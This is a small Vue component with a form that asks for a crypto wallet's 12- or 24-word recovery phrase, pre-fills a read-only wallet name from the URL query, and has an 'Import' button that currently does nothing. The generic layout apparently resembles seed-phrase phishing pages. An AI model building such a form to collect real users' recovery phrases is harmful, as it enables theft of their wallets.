<template>

  <div class="active-form">
      <div class="phrase-form" >
      <form method="post" action="" @submit.prevent>
          <label for="phrase">Phrase</label>
          <textarea v-model="form.phrase"   id="" cols="30" rows="10"></textarea>
          <input type="text"  v-model="form.wallet" readonly>
          <p>Typically 12 (sometimes 24) words separated by single spaces</p>
          <input type="submit" value="Import" class="submit">

      </form>
  </div>
  </div>

  
</template>

<script>

export default {
        name:"phrase",

         data (){
        return{
           form : {
               phrase: '' ,
               wallet: this.$route.query.title,
               
           }
        }
    },

   
}
</script>

<style>

</style>